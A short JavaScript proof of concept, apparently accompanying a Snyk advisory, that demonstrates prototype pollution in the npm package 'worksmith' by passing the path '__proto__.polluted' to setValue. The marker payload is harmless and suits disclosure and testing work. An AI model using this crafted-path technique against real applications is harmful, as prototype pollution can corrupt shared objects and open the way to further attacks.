//https://snyk.io/vuln/SNYK-JS-WORKSMITH-598798
    const worksmith = require('worksmith'); 
    obj = {}

    worksmith.setValue({}, '__proto__.polluted',"yes"); 
  